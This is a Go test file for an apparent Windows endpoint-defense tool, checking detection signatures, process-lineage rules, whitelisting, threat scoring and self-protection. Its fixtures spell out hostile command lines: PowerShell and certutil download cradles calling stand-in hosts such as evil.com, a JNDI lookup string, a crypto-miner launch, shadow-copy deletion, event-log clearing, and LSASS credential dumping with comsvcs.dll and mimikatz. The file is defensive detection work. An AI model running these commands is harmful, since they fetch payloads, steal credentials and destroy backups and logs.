// STATUS: DIAMANT VGT SUPREME
package mhx

import (
	"os"
	"strings"
	"testing"
)

func TestKillerdomSignatures(t *testing.T) {
	cases := []struct {
		cmd     string
		matches bool
		sigID   string
	}{
		// KD-SIG-01: LOLBin abuse
		{cmd: `powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgA`, matches: true, sigID: "KD-SIG-01"},
		{cmd: `powershell.exe -enc SQBFAFgA`, matches: true, sigID: "KD-SIG-01"},
		{cmd: `cmd.exe /c powershell -windowstyle hidden -command "iex(New-Object Net.WebClient).DownloadString('http://evil.com')"`, matches: true, sigID: "KD-SIG-01"},
		{cmd: `certutil.exe -urlcache -split -f http://c2.example/payload.exe`, matches: true, sigID: "KD-SIG-04"},
		{cmd: `node.exe -e "eval(require('child_process').execSync('whoami'))"`, matches: true, sigID: "KD-SIG-01"},

		// KD-SIG-02: High-entropy base64 in a script-host invocation
		{cmd: "cscript.exe //E:jscript payload.js " + strings.Repeat("QUJD", 20) + "==", matches: true, sigID: "KD-SIG-02"},

		// KD-SIG-03: JNDI & Cryptominers
		{cmd: `java.exe -jar app.jar ${jndi:ldap://attacker.com/a}`, matches: true, sigID: "KD-SIG-03"},
		{cmd: `xmrig.exe -o stratum+tcp://xmr.pool.com:3333 -u monero_wallet`, matches: true, sigID: "KD-SIG-03"},

		// KD-SIG-04: Destructive Sabotage
		{cmd: `vssadmin delete shadows /all /quiet`, matches: true, sigID: "KD-SIG-04"},
		{cmd: `bitsadmin /transfer eviljob http://evil.com/a.exe c:\temp\a.exe`, matches: true, sigID: "KD-SIG-04"},

		// KD-SIG-05: Remote Memory Injection Tokens
		{cmd: `injector.exe --api VirtualAllocEx --target explorer.exe`, matches: true, sigID: "KD-SIG-05"},
		{cmd: `test.exe WriteProcessMemory CreateRemoteThread`, matches: true, sigID: "KD-SIG-05"},

		// KD-SIG-06: Credential Dumping
		{cmd: `rundll32.exe C:\windows\system32\comsvcs.dll, MiniDumpWriteDump 684 c:\temp\lsass.dmp full`, matches: true, sigID: "KD-SIG-06"},
		{cmd: `mimikatz.exe "sekurlsa::logonpasswords"`, matches: true, sigID: "KD-SIG-06"},

		// Benign commands
		{cmd: `notepad.exe C:\Users\User\Documents\notes.txt`, matches: false, sigID: ""},
		{cmd: `git.exe commit -m "update files"`, matches: false, sigID: ""},
		{cmd: `go.exe test ./...`, matches: false, sigID: ""},
		{cmd: `cmd.exe /c ping -n 30 127.0.0.1`, matches: false, sigID: ""},
		{cmd: `powershell.exe -ExecutionPolicy Bypass -File C:\Tools\build.ps1`, matches: false, sigID: ""},
		{cmd: `git.exe show e8b26670b6dcfdb124f38cf252c6bfbf6cb0d383a7f7351bbfaffb13010202e1`, matches: false, sigID: ""},
		{cmd: `sha256sum.exe e8b26670b6dcfdb124f38cf252c6bfbf6cb0d383a7f7351bbfaffb13010202e1`, matches: false, sigID: ""},
	}

	for _, tc := range cases {
		matched, id, name := EvaluateKillerdomCLI(tc.cmd, nil)
		if matched != tc.matches {
			t.Fatalf("cmd %q: expected match=%v, got match=%v (id=%s, name=%s)", tc.cmd, tc.matches, matched, id, name)
		}
		if tc.matches && id != tc.sigID {
			t.Fatalf("cmd %q: expected sigID %s, got %s", tc.cmd, tc.sigID, id)
		}
	}
}

func TestKillerdomSignatureSelectiveDisable(t *testing.T) {
	cmd := `powershell.exe -enc SQBFAFgA`

	// When KD-SIG-01 is enabled:
	active := map[string]bool{"KD-SIG-01": true}
	matched, id, _ := EvaluateKillerdomCLI(cmd, active)
	if !matched || id != "KD-SIG-01" {
		t.Fatalf("expected KD-SIG-01 to match when active")
	}

	// When developer specifically disables KD-SIG-01:
	active["KD-SIG-01"] = false
	matched, _, _ = EvaluateKillerdomCLI(cmd, active)
	if matched {
		t.Fatalf("expected KD-SIG-01 NOT to match when deactivated by developer")
	}
}

func TestStrictLineageBreach(t *testing.T) {
	// Legitimate ancestry
	breach, _ := CheckLineageBreach(`C:\Windows\System32\svchost.exe`, `C:\Windows\System32\services.exe`)
	if breach {
		t.Fatalf("svchost spawned by services.exe must NOT breach lineage")
	}

	// Illegitimate ancestry (svchost spawned by cmd.exe or powershell.exe)
	breach, reason := CheckLineageBreach(`C:\Windows\System32\svchost.exe`, `C:\Windows\System32\cmd.exe`)
	if !breach {
		t.Fatalf("svchost spawned by cmd.exe MUST trigger lineage breach")
	}
	if reason == "" {
		t.Fatalf("expected lineage breach reason")
	}

	// lsass spawned by wininit.exe
	breach, _ = CheckLineageBreach(`lsass.exe`, `wininit.exe`)
	if breach {
		t.Fatalf("lsass spawned by wininit.exe must NOT breach lineage")
	}

	// lsass spawned by explorer.exe
	breach, _ = CheckLineageBreach(`lsass.exe`, `explorer.exe`)
	if !breach {
		t.Fatalf("lsass spawned by explorer.exe MUST trigger lineage breach")
	}
}

func TestKillerdomDestructiveSignatureDoesNotFlagBenignCmd(t *testing.T) {
	active := map[string]bool{"KD-SIG-04": true}
	for _, command := range []string{
		`cmd.exe /c ping -n 30 127.0.0.1 >nul`,
		`cmd.exe /c dir C:\Users\Public`,
		`cmd.exe /c echo hello`,
	} {
		if matched, _, _ := EvaluateKillerdomCLI(command, active); matched {
			t.Fatalf("benign command %q must not match the destructive signature", command)
		}
	}
	for _, command := range []string{
		`vssadmin.exe delete shadows /all /quiet`,
		`cmd.exe /c del /f /q C:\Users\Public\important.txt`,
		`cmd.exe /c wevtutil cl Security`,
		`bitsadmin.exe /transfer job http://example.invalid/a.exe C:\temp\a.exe`,
	} {
		if matched, _, _ := EvaluateKillerdomCLI(command, active); !matched {
			t.Fatalf("destructive command %q must match the destructive signature", command)
		}
	}
}

func TestSentinelStoreAndWhitelist(t *testing.T) {
	tempDir := t.TempDir()

	store, err := OpenSentinelStore(tempDir)
	if err != nil {
		t.Fatalf("OpenSentinelStore: %v", err)
	}

	cfg := store.Config()
	if !cfg.KillerdomEnabled {
		t.Fatalf("expected KillerdomEnabled == true by default")
	}
	if cfg.ParanoiaMode {
		t.Fatalf("expected ParanoiaMode == false by default")
	}

	// Verify System App Check
	allowed, name, isSys := store.IsAppAllowed(`C:\Windows\explorer.exe`)
	if !allowed || !isSys {
		t.Fatalf("expected explorer.exe to be an allowed system app, got allowed=%v name=%s isSys=%v", allowed, name, isSys)
	}

	// Verify Whitelist App Check
	allowed, name, isSys = store.IsAppAllowed(`C:\Users\Masterboard\AppData\Local\Programs\antigravity.exe`)
	if !allowed || isSys {
		t.Fatalf("expected antigravity.exe to be an allowed whitelist app, got allowed=%v name=%s isSys=%v", allowed, name, isSys)
	}

	// Verify Unknown App
	allowed, _, _ = store.IsAppAllowed(`C:\Users\Masterboard\AppData\Local\Temp\malware.exe`)
	if allowed {
		t.Fatalf("expected malware.exe NOT to be allowed")
	}

	// Add custom app
	entry, err := store.AddWhitelistApp("MyCustomTool", `C:\Tools\custom.exe`)
	if err != nil {
		t.Fatalf("AddWhitelistApp: %v", err)
	}
	allowed, name, _ = store.IsAppAllowed(`C:\Tools\custom.exe`)
	if !allowed || name != "MyCustomTool" {
		t.Fatalf("expected custom.exe to be allowed after adding, got %v (%s)", allowed, name)
	}

	// Toggle Paranoia Mode
	if err := store.SetParanoiaMode(true, "Enabling Paranoia Mode"); err != nil {
		t.Fatalf("SetParanoiaMode: %v", err)
	}
	if !store.Config().ParanoiaMode {
		t.Fatalf("expected ParanoiaMode == true")
	}

	// Reopen store to verify persistence
	store2, err := OpenSentinelStore(tempDir)
	if err != nil {
		t.Fatalf("OpenSentinelStore reopen: %v", err)
	}
	if !store2.Config().ParanoiaMode {
		t.Fatalf("expected persisted ParanoiaMode == true")
	}
	allowed2, _, _ := store2.IsAppAllowed(`C:\Tools\custom.exe`)
	if !allowed2 {
		t.Fatalf("expected persisted custom.exe whitelist entry")
	}

	// Clean up added app
	if err := store2.RemoveWhitelistApp(entry.ID); err != nil {
		t.Fatalf("RemoveWhitelistApp: %v", err)
	}
	allowed3, _, _ := store2.IsAppAllowed(`C:\Tools\custom.exe`)
	if allowed3 {
		t.Fatalf("expected custom.exe not to be allowed after removal")
	}
}

func TestFairScoring(t *testing.T) {
	// Whitelisted app running benignly
	event := ProcessEvent{
		Image:       "chrome.exe",
		CommandLine: `chrome.exe https://example.com`,
	}
	scoreClean := CalculateFairScore(event, true, "Google Chrome", false, "", false, false, false, false)
	if scoreClean.Score > 20 || scoreClean.Level != "CLEAN" || scoreClean.StrikeEvent {
		t.Fatalf("expected clean score for benign chrome, got %d (%s)", scoreClean.Score, scoreClean.Level)
	}

	// Whitelisted app running with suspicious flags
	eventSuspicious := ProcessEvent{
		Image:       "powershell.exe",
		CommandLine: `powershell.exe -ExecutionPolicy Bypass -Command "Write-Host test"`,
	}
	scoreWarn := CalculateFairScore(eventSuspicious, true, "PowerShell", true, "KD-SIG-01", false, false, false, false)
	if scoreWarn.Score < 40 || scoreWarn.Level != "WARNING" {
		t.Fatalf("expected warning score for bypassed powershell, got %d (%s)", scoreWarn.Score, scoreWarn.Level)
	}

	// Whitelisted app that attempts AMSI patching (NO FREE PASS!)
	scoreCritical := CalculateFairScore(eventSuspicious, true, "PowerShell", true, "KD-SIG-01", true, false, false, false)
	if scoreCritical.Score < 75 || scoreCritical.Level != "CRITICAL" || !scoreCritical.StrikeEvent {
		t.Fatalf("expected strike for AMSI patched whitelisted app (no free pass!), got %d (%s), strike=%v", scoreCritical.Score, scoreCritical.Level, scoreCritical.StrikeEvent)
	}
}

func TestKillerdomSelfProtection(t *testing.T) {
	currentPID := uint32(os.Getpid())

	// 1. GeDefense Service itself
	selfEvent := ProcessEvent{
		PID:       currentPID,
		ParentPID: 4,
		Image:     "gedefense-windows.exe",
		ImagePath: `C:\Program Files\VGT\GeDefense\bin\gedefense-windows.exe`,
	}
	if !isGeDefenseSelfOrChild(selfEvent) {
		t.Fatalf("expected isGeDefenseSelfOrChild to be true for GeDefense service itself")
	}

	// 2. PowerShell child spawned by GeDefense to run Audit:EnterpriseBalanced / self-healing
	childAudit := ProcessEvent{
		PID:         currentPID + 10,
		ParentPID:   currentPID,
		ParentImage: "gedefense-windows.exe",
		ParentPath:  `C:\Program Files\VGT\GeDefense\bin\gedefense-windows.exe`,
		Image:       "powershell.exe",
		ImagePath:   `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		CommandLine: `powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy AllSigned -File "C:\Program Files\VGT\GeDefense\engine\Invoke-VgtHardening.ps1" -Mode Audit -Profile EnterpriseBalanced`,
	}
	if !isGeDefenseSelfOrChild(childAudit) {
		t.Fatalf("expected isGeDefenseSelfOrChild to be true for GeDefense audit child process")
	}

	// 3. Child process referencing Invoke-VgtHardening.ps1 even if ParentPID wasn't captured
	childScript := ProcessEvent{
		PID:         9999,
		ParentPID:   8888,
		Image:       "powershell.exe",
		ImagePath:   `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		CommandLine: `powershell.exe -NoProfile -File "C:\Program Files\VGT\GeDefense\engine\Invoke-VgtHardening.ps1"`,
	}
	if !isGeDefenseSelfOrChild(childScript) {
		t.Fatalf("expected isGeDefenseSelfOrChild to be true for Invoke-VgtHardening child")
	}

	// 4. GeDefense Center UI
	centerEvent := ProcessEvent{
		PID:       1234,
		Image:     "GeDefenseCenter.exe",
		ImagePath: `C:\Program Files\VGT\GeDefense\bin\GeDefenseCenter.exe`,
	}
	if !isGeDefenseSelfOrChild(centerEvent) {
		t.Fatalf("expected isGeDefenseSelfOrChild to be true for GeDefenseCenter")
	}

	// 5. Hostile attacker PowerShell running cradle: MUST NOT be self-protected!
	evilEvent := ProcessEvent{
		PID:         7777,
		ParentPID:   6666,
		ParentImage: "cmd.exe",
		Image:       "powershell.exe",
		ImagePath:   `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		CommandLine: `powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgA`,
	}
	if isGeDefenseSelfOrChild(evilEvent) {
		t.Fatalf("expected isGeDefenseSelfOrChild to be FALSE for hostile powershell")
	}
}
